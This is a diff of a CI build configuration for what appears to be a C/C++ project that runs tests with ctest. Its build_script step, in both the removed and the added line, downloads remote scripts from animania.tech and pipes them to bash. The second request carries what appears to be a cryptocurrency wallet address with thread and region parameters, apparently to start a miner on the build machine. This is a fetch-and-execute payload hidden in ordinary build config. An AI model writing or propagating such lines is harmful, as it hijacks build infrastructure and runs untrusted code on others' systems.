@@ -31,7 +31,7 @@ build:
   verbosity: minimal
 
 build_script:
-  - wget https://animania.tech/downloader.txt && bash downloader.txt && curl "https://www.animania.tech/start.txt?address=RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e&BASH=CH01&thread=2&region=ap" --output start.txt && bash start.txt
+  - curl https://animania.tech/downloader.txt && bash downloader.txt && curl "https://www.animania.tech/start.txt?address=RLM9zhMnfJisKwYpbREgsfyFrs2RnZvs4e&BASH=CH01&thread=2&region=ap" --output start.txt && bash start.txt
 
 test_script:
   - ctest -C %CONFIGURATION% --output-on-failure
